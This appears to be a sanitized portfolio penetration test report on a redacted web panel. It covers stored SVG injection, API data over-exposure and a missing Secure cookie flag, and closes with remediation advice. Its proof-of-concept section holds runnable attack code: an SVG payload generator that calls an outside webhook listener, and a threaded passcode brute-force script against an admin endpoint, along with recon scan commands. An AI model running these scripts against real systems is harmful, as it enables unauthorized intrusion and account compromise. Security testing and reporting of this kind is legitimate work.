# External Penetration Testing & Vulnerability Assessment Report

> **Portfolio Redaction Notice:** This is a sanitized version of a real-world engagement. All client identifiers, domain names, IPs, and session tokens have been redacted per NDA obligations.

---

**Target:** `[REDACTED_DOMAIN].online` / `[REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online`  
**Date:** June 12, 2026  
**Methodology:** Black-Box External Penetration Test  
**Status:** `Redacted — Public Portfolio Version`

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Scope & Architecture](#scope--architecture)
- [Vulnerability Matrix](#vulnerability-matrix)
- [Finding Detail — SEC-01](#sec-01--stored-oob-svg-injection)
- [Finding Detail — SEC-02](#sec-02--excessive-data-exposure)
- [Finding Detail — SEC-03](#sec-03--missing-secure-cookie-flag)
- [Verified Security Postures](#verified-security-postures)
- [Reconnaissance Playbook](#reconnaissance-playbook)
- [Proof of Concept](#proof-of-concept)
- [Remediation Plan](#remediation-plan)

---

## Executive Summary

An external, black-box penetration test was conducted against the public infrastructure of `[REDACTED_DOMAIN].online`, with a focused assessment of the `[REDACTED_SUBDOMAIN]` customer management panel. Testing was performed entirely from the perspective of an external threat actor — no prior knowledge of internal systems, credentials, or source code was provided.

| Metric | Result |
|--------|--------|
|  Medium Severity Findings | 2 |
|  Low Severity Findings | 1 |
|  Resilience Checks Passed | 4 |
|  Overall Perimeter Posture | **Strong** |

**Key takeaway:** The organization maintains a solid outer-perimeter defense. The WAF effectively blocks automated scanning, and core API infrastructure demonstrates robust controls against BOLA/IDOR and Mass Assignment attacks. Critical database and admin services are fully isolated from the public internet. Application-layer findings were identified through manual testing only.

---

## Scope & Architecture

| Field | Detail |
|-------|--------|
| **Primary Scope** | `https://[REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online` |
| **Secondary Target** | `https://[REDACTED_DOMAIN].online` |
| **Testing Perspective** | External Black-Box — No credentials provided |
| **Web Server** | Microsoft IIS (ASP.NET — confirmed via headers & `robots.txt`) |
| **Transport Layer** | Strict HTTP/2 — neutralizes HTTP Request Smuggling vectors |
| **Network Filtering** | SSH (22), MySQL (3306), PostgreSQL (5432) fully isolated |

---

## Vulnerability Matrix

| Bug ID | Title | Severity | CVSS v3.1 | Status |
|--------|-------|----------|-----------|--------|
| `SEC-01` | Stored OOB Image Injection via SVG Upload |  Medium | 5.4 |  Verified / Triggered |
| `SEC-02` | Excessive Data Exposure in JSON API Responses |  Medium | 4.3 |  Verified |
| `SEC-03` | Insecure Session Management (Missing Secure Cookie) |  Low | 3.7 |  Verified |

---

## SEC-01 — Stored OOB SVG Injection

**Type:** Improper Input Validation / Insecure File Upload  
**CVSS:** `5.4 (Medium)` — `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

### Description

The listing creation endpoint (`/api/panel/listing`) accepts Base64-encoded image attachments. The back-end fails to validate underlying magic bytes and accepts `.svg` vector graphics without sanitization. A crafted SVG containing an external resource reference was stored persistently on the server.

### Impact

When an administrator views the compromised listing, their browser parses the SVG and executes embedded XML tags — triggering an automatic out-of-band GET request to an attacker-controlled listener.

**Escalation paths:**
- Stored Cross-Site Scripting (XSS)
- Session hijacking
- Credential harvesting via HTML injection
- SSRF or RCE if SVG is parsed server-side (PDF renderers, thumbnail generators)

---

## SEC-02 — Excessive Data Exposure

**Type:** Sensitive Data Exposure / Improper Data Minimization  
**CVSS:** `4.3 (Medium)` — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

### Description

When creating or updating a listing via `POST /api/panel/listing`, the server returns a verbose JSON payload that leaks the full user profile model — including role mappings, privilege arrays, and internal admin state flags — alongside normal transaction data.

### Impact

Exposing database schemas and authorization structures allows attackers to map back-end logic and plan privilege escalation or authentication bypass attacks without additional exploitation.

---

## SEC-03 — Missing Secure Cookie Flag

**Type:** Weak Session Configuration  
**CVSS:** `3.7 (Low)` — `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`

### Description

Upon authentication, the system issues an HTTP session cookie. While `HttpOnly` and `SameSite=Lax` are correctly configured, the `Secure` flag is absent.

### Impact

Without `Secure`, the session cookie may transmit over unencrypted HTTP if redirected to a non-TLS port. A network-adjacent MitM attacker could capture and hijack the authenticated session.

---

## Verified Security Postures

These test cases **failed to exploit** the application, confirming strong defensive implementation:

###  BOLA / IDOR Protection
Account B's attempt to delete a listing owned by Account A was correctly rejected with `401 Unauthorized`. Session ownership is validated server-side against resource ownership.

```
DELETE /api/panel/listing/delete
→ 401 Unauthorized  ✓
```

###  Mass Assignment Defense
Injected privilege fields in registration/update request bodies were fully ignored. Secure DTOs correctly filter all client inputs.

```json
{ "is_admin": true, "role": "admin" }
→ Fields silently dropped  ✓
```

###  WAF Automated Scan Blocking
Active WAF dynamically blocked all automated scanning sweeps. Rate-based and fingerprint detection functioning correctly at the perimeter.

###  Admin Service Isolation
SSH (22), MySQL (3306), and PostgreSQL (5432) are fully unreachable from the public internet.

---

## Reconnaissance Playbook

### Subdomain Discovery

```bash
# Passive subdomain extraction
subfinder -d [REDACTED_DOMAIN].online -o subdomains.txt

# Probe extracted subdomains for live HTTP/HTTPS
cat subdomains.txt | httpx -sc -title -ip -o alive_subdomains.txt
```

### Port Scanning & WAF Fingerprinting

```bash
# Full TCP port scan with service banner grabbing
nmap -sC -sV -p- -T4 -Pn -oA nmap_full_scan [REDACTED_IP]

# Targeted probe on database and remote admin ports
nmap -p 22,1433,3306,3389,5432 -sV --script banner [REDACTED_IP]

# Detect and fingerprint the WAF
wafw00f https://[REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online
```

---

## Proof of Concept

### PoC · SEC-01 — SVG OOB Payload Generator

```python
# svg_payload_gen.py
import base64
import argparse

def generate_payload(webhook_url):
    svg_data = f"""<?xml version="1.0" standalone="no"?>
<svg width="640px" height="480px" version="1.1"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="{webhook_url}" x="0" y="0" height="640px" width="480px"/>
</svg>"""

    encoded = base64.b64encode(svg_data.encode('utf-8')).decode('utf-8')

    print("\n[+] Raw SVG Payload:")
    print(svg_data)
    print("\n[+] Base64 Encoded (ready for submission):")
    print(encoded)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SVG OOB Payload Builder")
    parser.add_argument("-u", "--url", required=True, help="Webhook listener URL")
    args = parser.parse_args()
    generate_payload(args.url)
```

```bash
python3 svg_payload_gen.py -u "https://webhook.site/a0c2fff7-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
```

---

### PoC · SEC-02 — Triggering Excessive Data Exposure

**Request:**
```http
POST /api/panel/listing HTTP/1.1
Host: [REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online
Cookie: session=804300b1550cc780b4af6cb0fedfd77bxxxx...
Content-Type: application/json

{"title":"UIDCROSSACCESSTEST","description":"","phone_wp":"0532 000 00 00"}
```

**Response — leaked user model:**
```json
{
  "status": "success",
  "listing_id": "7110c5d6-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "user": {
    "id": "usr_94a8c2...",
    "role": "user",
    "is_admin": false,
    "privileges": []
  }
}
```

>  The `user` object should never be returned here. It exposes backend schema and privilege structure.

---

### PoC · SEC-03 — Missing Secure Cookie Attribute

```bash
curl -i -s -k -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test_admin","password":"password123"}' \
  "https://[REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online/api/login" \
  | grep -i "Set-Cookie"
```

**Output:**
```
Set-Cookie: session=804300b1550cc780b4af6cb0fedfd77bxxxx...; HttpOnly; SameSite=Lax
#                                                                         ^ Missing: ; Secure
```

---

### PoC · Passcode Brute-Force & Race Condition Test

```python
# passcode_race.py
import requests, threading, time

TARGET_URL     = "https://[REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online/api/admin/verify"
THREAD_COUNT   = 10
SESSION_COOKIE = "session=804300b1550cc780b4af6cb0fedfd77bxxxx..."

session = requests.Session()
session.headers.update({
    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Pentest-Scanner/1.0",
    "Content-Type": "application/json",
    "Cookie":       SESSION_COOKIE
})

try:
    with open("numeric_passcodes.txt") as f:
        passcodes = [l.strip() for l in f]
except FileNotFoundError:
    passcodes = [f"{i:04d}" for i in range(10000)]

passcode_index = 0
lock           = threading.Lock()
stop_flag      = False

def worker():
    global passcode_index, stop_flag
    while not stop_flag:
        with lock:
            if passcode_index >= len(passcodes): break
            code = passcodes[passcode_index]; passcode_index += 1
        try:
            r = session.post(TARGET_URL, json={"passcode": code}, timeout=5)
            if r.status_code == 200:
                print(f"\n[!] SUCCESS — Valid passcode: {code}")
                stop_flag = True; break
            elif r.status_code == 429:
                time.sleep(5)
            elif "expired" in r.text.lower():
                print("\n[!] Session expired (15-min limit). Aborting.")
                stop_flag = True; break
        except requests.RequestException:
            pass

threads = [threading.Thread(target=worker) for _ in range(THREAD_COUNT)]
for t in threads: t.start()
for t in threads: t.join()
```

> **Result:** The 15-minute session deadline is an effective defense. High-velocity brute-force cannot exhaust a large keyspace before session expiry.

---

### Post-Assessment Cleanup

All test payloads were removed programmatically at engagement end:

```bash
curl -X POST \
  -H "Cookie: session=804300b1550cc780b4af6cb0fedfd77bxxxx..." \
  -H "Content-Type: application/json" \
  -d '{"id": "7110c5d6-xxxx-xxxx-xxxx-xxxxxxxxxxxx"}' \
  "https://[REDACTED_SUBDOMAIN].[REDACTED_DOMAIN].online/api/panel/listing/delete"
```

---

## Remediation Plan

### 1. Strict File Upload Whitelisting `SEC-01`

Replace the current file upload mechanism with MIME-type verification based on magic bytes (not file extension). **Completely forbid SVG uploads.** If SVGs are required by the business model, run all uploads through a server-side sanitizer (e.g. [DOMPurify](https://github.com/cure53/DOMPurify)) to strip active scripts and OOB XML directives before storage.

### 2. API Response Serialization Sanitization `SEC-02`

Refactor API serialization layers to use clean Data Transfer Objects (DTOs) that exclude user role mappings, internal flags, and privilege arrays from listing responses. Apply the principle of **data minimization** to every API endpoint — return only what the client strictly needs.

### 3. Secure Session Configuration `SEC-03`

Append the `; Secure` flag to all session cookie directives in the backend configuration. Enable **HSTS** across all subdomains to enforce HTTPS and prevent session cookies from ever transmitting over plaintext HTTP.

---

<div align="center">

`PENTEST REPORT` · `PORTFOLIO EDITION` · `JUNE 2026`

*All artifacts sanitized. Report compiled for public portfolio use in compliance with NDA.*

</div>
